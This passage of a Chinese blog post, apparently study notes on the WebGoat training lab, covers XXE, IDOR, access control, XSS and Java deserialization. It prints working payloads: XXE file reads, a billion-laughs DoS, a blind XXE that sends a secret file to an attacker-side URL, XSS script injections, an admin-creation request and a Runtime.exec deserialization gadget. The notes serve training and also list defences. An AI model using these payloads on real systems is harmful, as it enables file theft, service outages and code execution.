class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>后面&js;就会被替换成passwd里面的内容</p>
+<blockquote>
+<p>The extra document type definition(DOCTYPE) is something you can always add to the xml document and if the parser settings are <strong>enabled to allow external entities to be processed</strong> you are off to a good start for finding a XXE injection.</p>
+</blockquote>
+<p>”SYSTEM”关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害</p>
+<h3 id="第一道题目"><a href="#第一道题目" class="headerlink" title="第一道题目"></a>第一道题目</h3><p>原POST的数据：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span>try<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>替换成：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[<span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///root/&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010164125838.png" alt="image-20211010164125838"></p>
+<p>但是没过，麻了<br>哦哦，原来是文件系统的根目录（the root directory of the filesystem），不是root目录</p>
+<h3 id="代码审计找XXE"><a href="#代码审计找XXE" class="headerlink" title="代码审计找XXE"></a>代码审计找XXE</h3><p>呃，有点难</p>
+<h3 id="第二道题目"><a href="#第二道题目" class="headerlink" title="第二道题目"></a>第二道题目</h3><p>有点像是现实中，就临时修了下漏洞<br>一开始传输的是json数据（<code>Content-Type: application/json</code>），提交xml显示说失败<br>然后修改为<code>Content-Type: application/xml</code>，再提交xml就成功了<br>类似于替换新接口，但是原接口还启用着<br><strong>（json &lt;-&gt; xml）</strong></p>
+<p>现实情况可以考虑先修改传输类型，看看会不会报错<br>在判断有无XXE</p>
+<p>更真实的情况：</p>
+<ol>
+<li>先修改传输类型看看报错（<code>Content-Type</code>）</li>
+<li>传输基本XML数据，如“&lt;text&gt;hello&lt;&#x2F;text&gt;”，看看报错</li>
+<li>根据报错信息，逐步完善XML结构，如“&lt;comment&gt;&lt;text&gt;hello&lt;&#x2F;text&gt;&lt;&#x2F;comment&gt;”</li>
+<li>如能成功，再尝试XXE</li>
+</ol>
+<p>启示：防护要全面，旧风险要尽可能地清除</p>
+<h3 id="XXE-DOS"><a href="#XXE-DOS" class="headerlink" title="XXE DOS"></a>XXE DOS</h3><p>代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">lolz</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：<br>总之就是迭代定义<br>直接让这个XML数据耗掉服务器大量内存（3 gigabytes，理论上）<br>从而形成DOS</p>
+<h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>有时候会看不到回显，可能是这次XXE攻击纯粹地没有回显，又或者是尝试读取的非法XML包含了非法字符导致解析器失效<br>这种XXE攻击和SQL盲注类似 </p>
+<p>然后是上演示，不太好理解 </p>
+<p>最后总结：<br>所以有了XXE，我们可以ping我们自己的服务器，这意味着XXE注入是可能的<br>因此，通过使用XXE注入，我们基本上能够达到与一开始使用curl命令时相同的效果</p>
+<p>对应题目：<br>还是不太懂哈<br>事先准备如下文件放到攻击者服务器</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010164554779.png" alt="image-20211010164554779"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY attack SYSTEM &#x27;http://www.webgoat.local:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后注入如下的XXE payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///root/.webgoat-8.2.2//XXE/secret.txt&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:9090/files/arcyxu/try.dtd&quot;</span>&gt;</span>%test;%payload;]&gt;</span><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span><span class="symbol">&amp;attack;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以在攻击者的服务器中发现如下的记录：<br>其中text参数的值就是目标信息</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010164758085.png" alt="image-20211010164758085"></p>
+<p>初步分析下，这是POST的内容：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010164852470.png" alt="image-20211010164852470"></p>
+<p>然后根据替换规则，会变成下面的样子？</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010164904395.png" alt="image-20211010164904395"></p>
+<p>所以会向攻击者服务器（landing）发送GET请求，并通过file参数泄露信息？</p>
+<p>盲注在于，信息不会直接回显到页面上，需要另外设置接收信息的地方<br>这次是攻击者的服务器log</p>
+<p>其他人博客的分析：</p>
+<blockquote>
+<p>第一步包含本地文件，把内容存在file中<br>第二步远程包含webwolf上的dtd<br>第三步解析webwolf上的dtd，把file内容赋值给txt，作为参数发给webwolf</p>
+</blockquote>
+<p>总之就是难搞</p>
+<h3 id="XXE-防御"><a href="#XXE-防御" class="headerlink" title="XXE 防御"></a>XXE 防御</h3><p>JAVA里面可以设置XML解释器完全忽视DTD：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010165007256.png" alt="image-20211010165007256"></p>
+<p>或者是指示XML解释器仅忽视外部DTD：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010165019368.png" alt="image-20211010165019368"></p>
+<p>或者是进行验证：</p>
+<ul>
+<li>对Content-type和Accept报头进行验证</li>
+<li>不要简单地依赖框架来处理传入请求</li>
+<li>如果客户端指定了一个不合适的accept报头，返回一个’406&#x2F;Not Acceptable’</li>
+</ul>
+<h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><p>一个工具：SonarQube<br>可以对代码进行静态分析，从而发现潜在的XXE漏洞</p>
+<h2 id="不安全的对象直接引用"><a href="#不安全的对象直接引用" class="headerlink" title="不安全的对象直接引用"></a>不安全的对象直接引用</h2><p>Insecure Direct Object References（<strong>IDOR</strong>）</p>
+<h3 id="直接对象引用"><a href="#直接对象引用" class="headerlink" title="直接对象引用"></a>直接对象引用</h3><p>Direct Object References</p>
+<p>指应用程序使用客户端提供的输入来访问数据和对象<br>即可能存在的任意资源访问风险</p>
+<p>如：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://some.company.tld/dor?id=12345">https://some.company.tld/dor?id=12345</a></li>
+<li><a target="_blank" rel="noopener" href="https://some.company.tld/images?img=12345">https://some.company.tld/images?img=12345</a></li>
+</ul>
+<p>不仅是GET，其他方法也有可能导致任意资源访问的问题<br>容易导致越权或敏感信息泄露问题</p>
+<p>测试越权最好能控制多个账号</p>
+<ul>
+<li>同等级&#x2F;权限的不同账号</li>
+<li>不同等级&#x2F;权限的不同账号</li>
+</ul>
+<hr>
+<p>这里有一些抵御越权攻击的实现：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010175435955.png" alt="image-20211010175435955"></p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html">MORE HERE</a></p>
+<hr>
+<p>除了修改请求资源的字段之外<br>直接访问某不该被访问到的URL也算是越权</p>
+<p>一个猜访问字段&#x2F;备份URL的例子：<br>寻常访问资源的请求URL是：&#x2F;WebGoat&#x2F;IDOR&#x2F;profile<br>访问后返回一些配置文件，其中有个userId<br>然后就可以猜测如下的备份配置访问URL：&#x2F;WebGoat&#x2F;IDOR&#x2F;profile&#x2F;{userId}<br>然后就有越权读取任意用户配置文件风险</p>
+<p>有时不好猜，可能要FUZZ一波（封IP警告）</p>
+<hr>
+<p>防御措施：从endpoint（目的？）出发</p>
+<ul>
+<li>列出访问控制说明文件，审查访问控制规则</li>
+<li>做好访问日志记录，方便审查问题</li>
+<li>使用间接访问（Indrect References），例如使用hash、编码或其他方法处理后的值访问</li>
+<li>使用签名鉴权，如token、JWT等</li>
+</ul>
+<h3 id="应用层访问控制缺失"><a href="#应用层访问控制缺失" class="headerlink" title="应用层访问控制缺失"></a>应用层访问控制缺失</h3><p>Missing Function Level Access Control</p>
+<p>和IDOR的区别：</p>
+<ul>
+<li>IDOR更多地是强调水平&#x2F;垂直的访问控制&#x2F;越权问题</li>
+<li>应用层访问控制缺失强调的是“应用层功能暴露”（？）</li>
+</ul>
+<p>有一个例子<br>大概就是曾经有一些网站，试图使用javascript来在UI中隐藏一些管理员功能</p>
+<p>具体可以从以下方面入手去找：</p>
+<ul>
+<li>HTML或javascript元素</li>
+<li>被注释掉的元素</li>
+<li>通过CSS隐藏掉的部件</li>
+</ul>
+<hr>
+<p><strong>题目</strong></p>
+<p>根据上一题的提示，UI隐藏了两个菜单组件，对应URL如下：</p>
+<ul>
+<li>&#x2F;users</li>
+<li>&#x2F;config</li>
+</ul>
+<p>这是原始提交答案的数据包：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010175857235.png" alt="image-20211010175857235"></p>
+<p>然后根据提示，可以试试将方法改成GET<br>同时注意Content-Type改为’application&#x2F;json’（会影响到响应结果，经常忘哈）<br>然后，猜一猜接口路径，一路试下去，得到这个：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010175912751.png" alt="image-20211010175912751"></p>
+<p>即返回正确结果</p>
+<p>或者有另一种做法：</p>
+<blockquote>
+<p>OK, here it is.<br>First, create an admin user …<br>Change the method to POST, change the content-type to “application&#x2F;json”.<br>And your payload should look something like: </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;newUser2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;newUser12&quot;</span><span class="punctuation">,</span><span class="attr">&quot;matchingPassword&quot;</span><span class="punctuation">:</span><span class="string">&quot;newUser12&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;WEBGOAT_ADMIN&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Now log in as that user and bring up WebGoat&#x2F;users.<br>Copy your hash and log back in to your original account and input it there to get credit.</p>
+</blockquote>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>允许一些（组合的）html&#x2F;script作为输入，而没有检测或过滤<br>最广泛的Web安全漏洞<br>“富网络应用”的盛行，使得高权限的JS脚本变得普遍，给XSS提供了攻击点</p>
+<p>可通过浏览器控制台调用来查看本地cookie</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="可能的XSS位置"><a href="#可能的XSS位置" class="headerlink" title="可能的XSS位置"></a>可能的XSS位置</h3><ul>
+<li><strong>Search fields</strong> that echo a search string back to the user</li>
+<li><strong>Input fields</strong> that echo user data</li>
+<li><strong>Error messages</strong> that return user supplied text</li>
+<li><strong>Hidden fields</strong> that contain user supplied data</li>
+<li>Any <strong>page</strong> that displays user supplied data<ul>
+<li>Message boards</li>
+<li>Free form comments</li>
+</ul>
+</li>
+<li><strong>HTTP Headers</strong></li>
+</ul>
+<p>总之反射型XSS可能存在的地方一定要有能<strong>回显</strong>的地方</p>
+<h3 id="XSS的可能危害"><a href="#XSS的可能危害" class="headerlink" title="XSS的可能危害"></a>XSS的可能危害</h3><ul>
+<li><p>盗取cookies</p>
+</li>
+<li><p>创建错误请求</p>
+</li>
+<li><p>在页面上创建收集凭证的恶意域（fields）</p>
+</li>
+<li><p>重定向到恶意页面</p>
+</li>
+<li><p>伪造合法用户请求</p>
+</li>
+<li><p>盗取秘密信息</p>
+</li>
+<li><p>通过active script在终端系统执行恶意代码</p>
+</li>
+<li><p>在页面插入危险&#x2F;反动言论或图片</p>
+<p><code>&lt;img src=&quot;http://malicious.site.com/image.jpg/&gt;</code></p>
+</li>
+<li><p>增加用户受到钓鱼攻击的风险</p>
+<p>在URL中使用有效域</p>
+</li>
+</ul>
+<h3 id="XSS的类型"><a href="#XSS的类型" class="headerlink" title="XSS的类型"></a>XSS的类型</h3><ul>
+<li><p>反射型</p>
+<ul>
+<li><p>用户的恶意请求回显到浏览器上</p>
+</li>
+<li><p>恶意内容经服务器响应后写入到页面</p>
+</li>
+<li><p>社会工程学是必须的</p>
+</li>
+<li><p>在浏览器中使用从用户处继承的浏览器权限运行？</p>
+<blockquote>
+<p>Runs with browser privileges inherited from user in browser</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>存储型</p>
+<ul>
+<li>恶意内容存储到服务端，返回给页面的所有用户</li>
+<li>不太需要社会工程学</li>
+</ul>
+</li>
+<li><p>DOM-based（本质上是反射型）</p>
+<ul>
+<li>用户的恶意请求经<strong>用户端脚本</strong>以HTML形式写入到页面中</li>
+<li>在浏览器中使用从用户处继承的浏览器权限运行？</li>
+</ul>
+</li>
+</ul>
+<h3 id="反射型XSS的场景"><a href="#反射型XSS的场景" class="headerlink" title="反射型XSS的场景"></a>反射型XSS的场景</h3><ol>
+<li>Attacker sends a malicious URL to victim（所以要社工）</li>
+<li>Victim clicks on the link that loads malicious web page</li>
+<li>The malicious script embedded in the URL executes in the victim’s browser</li>
+<li>The script steals sensitive information, like the session id, and releases it to the attacker</li>
+<li>Victim does not realize attack occurred</li>
+</ol>
+<img src="image-20211011100914184.png" alt="image-20211011100914184" style="zoom: 50%;" />
+
+<h3 id="反射型XSS题目"><a href="#反射型XSS题目" class="headerlink" title="反射型XSS题目"></a>反射型XSS题目</h3><p>主要是教教怎么找页面中的注入点<br>可使用“alert()”或者是“console.log()”方法</p>
+<p>发现会把信用卡号作为字符串回显<br>就把卡号改为“&lt;script&gt;alert(“XSS”)&lt;&#x2F;script&gt;”<br>成功</p>
+<p>这种恶意脚本中没有指向外链，只起本地作用的叫“Self XSS”</p>
+<h3 id="反射型和DOM-based"><a href="#反射型和DOM-based" class="headerlink" title="反射型和DOM-based"></a>反射型和DOM-based</h3><p>DOM-based只是另一种形式的反射型<br>两者都是通过特殊链接触发，并反映到浏览器上<br>不同之处在于：DOM-based的payload永远不会去到服务端，只会在客户端起作用</p>
+<p>一个场景：</p>
+<ol>
+<li><p>Attacker sends a <strong>malicious URL</strong> to victim</p>
+</li>
+<li><p>Victim <strong>clicks</strong> on the link</p>
+</li>
+<li><p>That link may <strong>load a malicious web page</strong> or a web page they use (are logged into?) that has a <strong>vulnerable route&#x2F;handler</strong></p>
+</li>
+<li><p>If it’s a malicious web page, it may <strong>use it’s own JavaScript</strong> to <strong>attack another page&#x2F;url</strong> with a vulnerable route&#x2F;handler</p>
+</li>
+<li><p>The vulnerable page <strong>renders the payload</strong> and <strong>executes attack</strong> in the user’s context on that page&#x2F;site</p>
+</li>
+<li><p>Attacker’s malicious script <strong>may run commands</strong> <strong>with the privileges of local account</strong></p>
+</li>
+<li><p>Victim does not realize attack occurred</p>
+</li>
+<li><p>Malicious attackers don’t use “&lt;script&gt;alert(‘xss’)&lt;&#x2F;script&gt;”</p>
+</li>
+</ol>
+<p>也就是说DOM型XXS大概旨在对受害者本地机器形成危害，不要求收集信息</p>
+<h3 id="一些DOM-based题目"><a href="#一些DOM-based题目" class="headerlink" title="一些DOM-based题目"></a>一些DOM-based题目</h3><p>有点难度，因为要结合Backbone、路径控制等知识</p>
+<p>总之，提示说DOM-based XSS通常可以在客户端通过查找路径配置代码（route configurations in the client-side code）来发现<br>寻找可以将输入“反映”到页面的路径</p>
+<p>在这题中，可以在路径控制程序（原文为handler）中找到一些测试代码<br>这里要了解WebGoat使用backbone作为主要的JavaScript路径配置库<br>同时这些开发过程中的测试代码被遗留在了正式产品中<br>这些测试代码通常是危险且易利用的</p>
+<p>这里的URL为：<br><a target="_blank" rel="noopener" href="http://www.webgoat.local:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9">www.webgoat.local:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9</a><br>可以知道基本路径为：start.mvc#lesson<br>再后面的是JavaScript路径控制程序的参数</p>
+<p>下面的任务就是找到WebGoat在开发过程中遗留的测试代码</p>
+<hr>
+<p><strong>解法</strong></p>
+<p>根据提示，打开浏览器控制台检查元素，发现Route控制的相关js脚本：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211011112729918.png" alt="image-20211011112729918"></p>
+<p>链接：<a target="_blank" rel="noopener" href="http://www.webgoat.local:8080/WebGoat/js/goatApp/view/GoatRouter.js">http://www.webgoat.local:8080/WebGoat/js/goatApp/view/GoatRouter.js</a></p>
+<p>审查代码，查找“test”，有发现：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211011112931423.png" alt="image-20211011112931423"></p>
+<p>得到答案，基本路径为：start.mvc#test&#x2F;</p>
+<hr>
+<p>下一题</p>
+<p>进一步利用上一题发现的测试代码<br>直接访问路径：<a target="_blank" rel="noopener" href="http://www.webgoat.local:8080/WebGoat/start.mvc#test/">http://www.webgoat.local:8080/WebGoat/start.mvc#test/</a><br>然后发现后面的参数会被直接回显到页面上，考虑XSS</p>
+<p>于是测试出下面的payload：<br><a target="_blank" rel="noopener" href="http://www.webgoat.local:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()">http://www.webgoat.local:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()</a><br>不知为啥后面不能跟“&lt;&#x2F;script&gt;”，不然控制台里显示不出结果</p>
+<h3 id="答题环节"><a href="#答题环节" class="headerlink" title="答题环节"></a>答题环节</h3><p>有一个<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">推荐阅读</a></p>
+<p>嗯，题目没啥特别的，过</p>
+<h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>使用反序列化在各编程语言中略有不同<br>如Java、PHP、Python、Ruby、C&#x2F;C++<br>但在关键概念上是一样的</p>
+<p><strong>序列化</strong>：将（内存中的）对象转化成数据格式，以便存储或传输<br><strong>反序列化</strong>：上述的反过程，从某种格式的数据中构建对象</p>
+<p>如今最受欢迎的序列化数据格式是JSON，在这之前是XML</p>
+<p>只有数据是序列化的，而代码本身不是</p>
+<h3 id="Native-Serialization"><a href="#Native-Serialization" class="headerlink" title="Native Serialization"></a>Native Serialization</h3><p>姑且翻译为本地序列化&#x2F;客制序列化</p>
+<p>一些编程语言提供了自己的序列化功能<br>所使用的数据格式比一般的JSON或XML拥有更多的特性和功能<br>甚至可以自行指定序列化的过程</p>
+<p>序列化&#x2F;反序列化的过程以及这些特性可能会被攻击者恶意利用<br>从而达到DOS攻击、越权攻击以及RCE等效果</p>
+<h3 id="最简单的例子"><a href="#最简单的例子" class="headerlink" title="最简单的例子"></a>最简单的例子</h3><p>一段经典Java代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="type">AcmeObject</span> <span class="variable">acme</span> <span class="operator">=</span> (AcmeObject)ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>期望获取一个AcmeObject，但在强制类型转换之前调用readObject()方法<br>攻击者要做的就是找到一个合适的类，来在调用readObject()时执行危险操作<br>攻击者可以序列化该对象，并使程序强制执行恶意操作</p>
+<p>这个合适的类在类路径（ClassPath）中找<br>（因为仅能使用已包含的包的关系？）</p>
+<p>一个危险的可序列化的Java类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line">        <span class="keyword">private</span> String taskAction;</span><br><span class="line">        <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>();</span><br><span class="line">                <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">                <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">                <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//deserialize data so taskName and taskAction are available</span></span><br><span class="line">                stream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//关键在这里？在上面执行完readObject()之后执行taskAction指定的代码？</span></span><br><span class="line">                Runtime.getRuntime().exec(taskAction);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>针对上面的Java类，攻击者可以序列化一个恶意对象并形成RCE<br><a name="anchor1">Exploit</a>如下：</p>
